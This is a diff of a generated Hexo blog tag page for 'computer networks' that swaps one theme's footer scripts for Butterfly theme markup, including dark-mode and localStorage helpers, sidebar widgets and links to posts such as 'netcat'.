-        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
-      window.cookieconsent.initialise({
-        type: "info",
-        theme: "edgeless",
-        static: false,
-        position: "bottom-left",
-        content: {
-          message: "此网站使用Cookie来改善您的体验。",
-          dismiss: "知道了！",
-          allow: "允许使用Cookie",
-          deny: "拒绝",
-          link: "了解更多",
-          policy: "Cookie政策",
-          href: "https://www.cookiesandyou.com/",
-        },
-        palette: {
-          popup: {
-            background: "#edeff5",
-            text: "#838391"
-          },
-          button: {
-            background: "#4b81e8"
-          },
-        },
-      });
-    });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
-            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
-        });</script></body></html>
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/></div></div><div class="page" id="body-wrap"><header class="not-home-page" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">胡小宁的博客</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="page-site-info"><h1 id="site-title">计算机网络</h1></div></header><main class="layout" id="content-inner"><div id="tag"><div class="article-sort-title">标签 - 计算机网络</div><div class="article-sort"><div class="article-sort-item year">2021</div><div class="article-sort-item"><div class="article-sort-item-info"><div class="article-sort-item-time"><i class="far fa-calendar-alt"></i><time class="post-meta-date-created" datetime="2021-07-16T15:54:54.000Z" title="发表于 2021-07-16 23:54:54">2021-07-16</time></div><a class="article-sort-item-title" href="/2021/07/16/netcat/" title="netcat">netcat</a></div></div><div class="article-sort-item"><div class="article-sort-item-info"><div class="article-sort-item-time"><i class="far fa-calendar-alt"></i><time class="post-meta-date-created" datetime="2021-07-16T13:44:33.000Z" title="发表于 2021-07-16 21:44:33">2021-07-16</time></div><a class="article-sort-item-title" href="/2021/07/16/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" title="大话计算机网络">大话计算机网络</a></div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">胡小宁</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2021/07/17/%E7%B2%92%E8%AE%A1%E7%AE%97%E7%BB%BC%E8%BF%B0/" title="粒计算综述">粒计算综述</a><time datetime="2021-07-16T16:49:45.000Z" title="发表于 2021-07-17 00:49:45">2021-07-17</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/07/17/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%EF%BC%9A%E8%BF%9B%E7%A8%8B%E8%BF%98%E6%98%AF%E7%BA%BF%E7%A8%8B%EF%BC%9F/" title="架构设计：进程还是线程？">架构设计：进程还是线程？</a><time datetime="2021-07-16T16:47:27.000Z" title="发表于 2021-07-17 00:47:27">2021-07-17</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/07/17/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%EF%BC%9A%E7%94%9F%E4%BA%A7%E8%80%85-%E6%B6%88%E8%B4%B9%E8%80%85%E6%A8%A1%E5%BC%8F/" title="架构设计：生产者/消费者模式">架构设计：生产者/消费者模式</a><time datetime="2021-07-16T16:37:29.000Z" title="发表于 2021-07-17 00:37:29">2021-07-17</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/07/17/%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%EF%BC%9F/" title="如何防范黑客入侵？">如何防范黑客入侵？</a><time datetime="2021-07-16T16:21:38.000Z" title="发表于 2021-07-17 00:21:38">2021-07-17</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/07/17/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/" title="社会工程学">社会工程学</a><time datetime="2021-07-16T16:06:02.000Z" title="发表于 2021-07-17 00:06:02">2021-07-17</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            <a class="card-more-btn" href="/categories/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a>
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"><span class="card-category-list-name">人工智能</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"><span class="card-category-list-name">数据分析</span><span class="card-category-list-count">7</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"><span class="card-category-list-name">经验分享</span><span class="card-category-list-count">11</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"><span class="card-category-list-name">编程语言</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/"><span class="card-category-list-name">编程随想</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/"><span class="card-category-list-name">脚本语言</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"><span class="card-category-list-name">计算机基础</span><span class="card-category-list-count">22</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"><span class="card-category-list-name">闲言碎语</span><span class="card-category-list-count">5</span></a></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/BootStrap/" style="font-size: 1.1em; color: #999">BootStrap</a> <a href="/tags/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%96%87%E7%BD%91/" style="font-size: 1.3em; color: #99a1ac">C语言中文网</a> <a href="/tags/Error%E8%A7%A3%E5%86%B3/" style="font-size: 1.1em; color: #999">Error解决</a> <a href="/tags/Java-Web/" style="font-size: 1.22em; color: #999ea4">Java Web</a> <a href="/tags/JavaScript/" style="font-size: 1.18em; color: #999ca1">JavaScript</a> <a href="/tags/Linux/" style="font-size: 1.1em; color: #999">Linux</a> <a href="/tags/SpringMVC/" style="font-size: 1.18em; color: #999ca1">SpringMVC</a> <a href="/tags/Vue/" style="font-size: 1.1em; color: #999">Vue</a> <a href="/tags/java/" style="font-size: 1.1em; color: #999">java</a> <a href="/tags/leetcode/" style="font-size: 1.1em; color: #999">leetcode</a> <a href="/tags/programthink/" style="font-size: 1.5em; color: #99a9bf">programthink</a> <a href="/tags/python/" style="font-size: 1.38em; color: #99a4b4">python</a> <a href="/tags/socket/" style="font-size: 1.3em; color: #99a1ac">socket</a> <a href="/tags/web%E5%BC%80%E5%8F%91/" style="font-size: 1.38em; color: #99a4b4">web开发</a> <a href="/tags/%E4%B9%A0%E9%A2%98/" style="font-size: 1.26em; color: #999fa8">习题</a> <a href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" style="font-size: 1.14em; color: #999b9d">人工智能</a> <a href="/tags/%E4%BA%BA%E7%94%9F/" style="font-size: 1.26em; color: #999fa8">人生</a> <a href="/tags/%E4%BD%9C%E4%B8%9A/" style="font-size: 1.1em; color: #999">作业</a> <a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 1.34em; color: #99a3b0">博客</a> <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 1.46em; color: #99a7bb">学习</a> <a href="/tags/%E5%AD%A6%E7%94%9F%E5%85%9A/" style="font-size: 1.1em; color: #999">学生党</a> <a href="/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/" style="font-size: 1.46em; color: #99a7bb">小妙招</a> <a href="/tags/%E6%80%A7%E6%95%99%E8%82%B2/" style="font-size: 1.1em; color: #999">性教育</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 1.5em; color: #99a9bf">操作系统</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.1em; color: #999">数据库</a> <a href="/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" style="font-size: 1.14em; color: #999b9d">期末复习</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 1.26em; color: #999fa8">框架</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 1.14em; color: #999b9d">爬虫</a> <a href="/tags/%E7%99%BD%E5%AB%96/" style="font-size: 1.1em; color: #999">白嫖</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 1.1em; color: #999">算法</a> <a href="/tags/%E7%B2%92%E8%AE%A1%E7%AE%97/" style="font-size: 1.1em; color: #999">粒计算</a> <a href="/tags/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/" style="font-size: 1.14em; color: #999b9d">统计学习方法</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" style="font-size: 1.3em; color: #99a1ac">网络编程</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/" style="font-size: 1.14em; color: #999b9d">计算机组成原理</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 1.14em; color: #999b9d">计算机网络</a> <a href="/tags/%E8%AE%BA%E6%96%87/" style="font-size: 1.1em; color: #999">论文</a> <a href="/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/" style="font-size: 1.42em; color: #99a6b7">课程设计</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/07/"><span class="card-archive-list-date">七月 2021</span><span class="card-archive-list-count">16</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/06/"><span class="card-archive-list-date">六月 2021</span><span class="card-archive-list-count">17</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/05/"><span class="card-archive-list-date">五月 2021</span><span class="card-archive-list-count">8</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/04/"><span class="card-archive-list-date">四月 2021</span><span class="card-archive-list-count">14</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/03/"><span class="card-archive-list-date">三月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/01/"><span class="card-archive-list-date">一月 2021</span><span class="card-archive-list-count">5</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">61</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2021-08-01T10:36:09.410Z"></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 胡小宁</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
